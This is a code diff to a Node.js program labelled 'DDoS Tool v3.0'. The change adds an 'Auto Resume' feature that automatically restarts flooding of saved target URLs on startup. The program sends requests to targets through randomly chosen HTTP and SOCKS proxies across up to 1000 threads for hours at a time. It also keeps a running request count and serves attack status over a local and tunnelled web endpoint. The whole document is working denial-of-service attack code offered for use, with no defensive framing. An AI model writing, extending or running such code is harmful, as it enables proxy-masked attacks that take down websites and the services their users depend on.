@@ -22,6 +22,7 @@ const numThreads = process.env.MAX_THREADS || 1000;
 let totalRequestsSent = 0;
 let nportUrl = null;
 let tunnelActive = false;
+let activeThreads = [];
 
 axios.defaults.timeout = 0;
 axios.defaults.maxRedirects = 0;
@@ -87,7 +88,7 @@ const createHttpsAgent = (proxyUrl, proxyProtocol) => {
 
 const ensureStateFileExists = () => {
   if (!fs.existsSync(stateFilePath)) {
-    fs.writeFileSync(stateFilePath, JSON.stringify({ continueAttack: false, sessions: [] }));
+    fs.writeFileSync(stateFilePath, JSON.stringify({ continueAttack: false, sessions: [], totalRequests: 0 }));
   }
 };
 
@@ -97,13 +98,14 @@ const loadState = () => {
     const data = fs.readFileSync(stateFilePath, "utf-8");
     return JSON.parse(data);
   } catch (error) {
-    return { continueAttack: false, sessions: [] };
+    return { continueAttack: false, sessions: [], totalRequests: 0 };
   }
 };
 
 let state = loadState();
 let continueAttack = state.continueAttack;
 let sessions = state.sessions || [];
+totalRequestsSent = state.totalRequests || 0;
 
 sessions = sessions.filter((session) => {
   const endTime = session.startTime + session.duration;
@@ -117,7 +119,7 @@ sessions = sessions.filter((session) => {
 if (sessions.length === 0) {
   continueAttack = false;
 }
-state = { continueAttack, sessions };
+state = { continueAttack, sessions, totalRequests: totalRequestsSent };
 fs.writeFileSync(stateFilePath, JSON.stringify(state));
 
 const proxyFilePath = path.join(__dirname, "proxy.txt");
@@ -145,7 +147,7 @@ const performAttack = async (sessions, agent, threadId) => {
 
   if (activeSessions.length === 0) {
     continueAttack = false;
-    state = { continueAttack: false, sessions: [] };
+    state = { continueAttack: false, sessions: [], totalRequests: totalRequestsSent };
     fs.writeFileSync(stateFilePath, JSON.stringify(state));
     return;
   }
@@ -173,6 +175,8 @@ const performAttack = async (sessions, agent, threadId) => {
   }
 
   totalRequestsSent += successfulRequests;
+  state.totalRequests = totalRequestsSent;
+  fs.writeFileSync(stateFilePath, JSON.stringify(state));
   
   const duration = Date.now() - startTime;
   if (threadId === 0 && duration > 0) {
@@ -184,6 +188,42 @@ const performAttack = async (sessions, agent, threadId) => {
 
   if (continueAttack) {
     setImmediate(() => performAttack(sessions, agent, threadId));
+  }
+};
+
+const resumeAttack = async () => {
+  if (continueAttack && sessions.length > 0) {
+    console.log(colors.yellow(`\n🔄 Resuming attack with ${sessions.length} target(s)...`));
+    
+    const proxies = loadProxies();
+    if (!proxies.length) {
+      console.log(colors.red('No proxies found for resume'));
+      return;
+    }
+
+    for (let i = 0; i < numThreads; i++) {
+      if (!continueAttack) break;
+
+      const randomProxy = getRandomElement(proxies);
+      const proxyParts = randomProxy.split(":");
+      
+      let proxyProtocol = "http";
+      let proxyHost = proxyParts[0];
+      let proxyPort = proxyParts[1];
+      
+      if (proxyHost.includes("socks")) {
+        proxyProtocol = "socks5";
+        proxyHost = proxyParts[0].replace("socks5://", "").replace("socks4://", "");
+      }
+      
+      const proxyUrl = `${proxyProtocol}://${proxyHost}:${proxyPort}`;
+      const agent = createHttpsAgent(proxyUrl, proxyProtocol);
+      
+      performAttack(sessions, agent, i);
+      activeThreads.push(i);
+    }
+    
+    console.log(colors.green(`✅ Resumed with ${activeThreads.length} threads`));
   }
 };
 
@@ -228,7 +268,7 @@ const startAttack = async (url, durationHours) => {
 
   sessions.push(newSession);
   continueAttack = true;
-  state = { continueAttack, sessions };
+  state = { continueAttack, sessions, totalRequests: totalRequestsSent };
   fs.writeFileSync(stateFilePath, JSON.stringify(state));
 
   console.log(colors.green(`\n🚀 Attack: ${url} for ${durationHours}h`));
@@ -259,6 +299,7 @@ const startAttack = async (url, durationHours) => {
     const agent = createHttpsAgent(proxyUrl, proxyProtocol);
     
     performAttack(sessions, agent, i);
+    activeThreads.push(i);
   }
   return true;
 };
@@ -270,7 +311,8 @@ const stopAttack = async () => {
   }
 
   continueAttack = false;
-  state = { continueAttack: false, sessions: [] };
+  activeThreads = [];
+  state = { continueAttack: false, sessions: [], totalRequests: totalRequestsSent };
   fs.writeFileSync(stateFilePath, JSON.stringify(state));
 
   console.log(colors.yellow(`\n🛑 Stopped`));
@@ -289,7 +331,7 @@ const showStatus = () => {
     console.log(`${colors.yellow('Target:')} ${s.url} | ${colors.gray(`${remaining}h left`)}`);
   });
   console.log(`${colors.green('Requests:')} ${formatNumber(totalRequestsSent)}`);
-  console.log(`${colors.cyan('Threads:')} ${numThreads}`);
+  console.log(`${colors.cyan('Threads:')} ${activeThreads.length}`);
   if (tunnelActive && nportUrl) {
     console.log(`${colors.magenta('URL:')} ${nportUrl}`);
   }
@@ -309,7 +351,7 @@ const showHelp = () => {
 
 const clearConsole = () => {
   console.clear();
-  console.log(colors.green('DDoS Tool v3.0'));
+  console.log(colors.green('DDoS Tool v3.0 - Auto Resume'));
   console.log(colors.gray('Type "help" for commands\n'));
 };
 
@@ -341,7 +383,7 @@ const handleCommand = async (cmd) => {
         startTime: Date.now(),
         duration: (args[1] ? parseFloat(args[1]) : 1) * 60 * 60 * 1000,
       });
-      state = { continueAttack, sessions };
+      state = { continueAttack, sessions, totalRequests: totalRequestsSent };
       fs.writeFileSync(stateFilePath, JSON.stringify(state));
       console.log(colors.green(`Added: ${args[0]}`));
       break;
@@ -353,7 +395,7 @@ const handleCommand = async (cmd) => {
       }
       sessions = sessions.filter((s) => s.url !== args[0]);
       if (sessions.length === 0) continueAttack = false;
-      state = { continueAttack, sessions };
+      state = { continueAttack, sessions, totalRequests: totalRequestsSent };
       fs.writeFileSync(stateFilePath, JSON.stringify(state));
       console.log(colors.green(`Removed: ${args[0]}`));
       break;
@@ -408,7 +450,7 @@ app.get("/status", (req, res) => {
     active: continueAttack,
     targets: sessions.map(s => s.url),
     totalRequests: totalRequestsSent,
-    threads: numThreads
+    threads: activeThreads.length
   });
 });
 
@@ -419,12 +461,14 @@ const port = process.env.PORT || 25694;
   
   app.listen(port, () => {
     console.clear();
-    console.log(colors.green(`\n⚡ DDoS Tool v3.0`));
+    console.log(colors.green(`\n⚡ DDoS Tool v3.0 - Auto Resume`));
     console.log(colors.cyan(`Local: http://localhost:${port}`));
     if (tunnelActive && nportUrl) {
       console.log(colors.magenta(`Public: ${nportUrl}`));
     }
     console.log(colors.green(`\nType "help" for commands\n`));
+    
+    resumeAttack();
     
     rl.setPrompt(colors.red('ddos> '));
     rl.prompt();
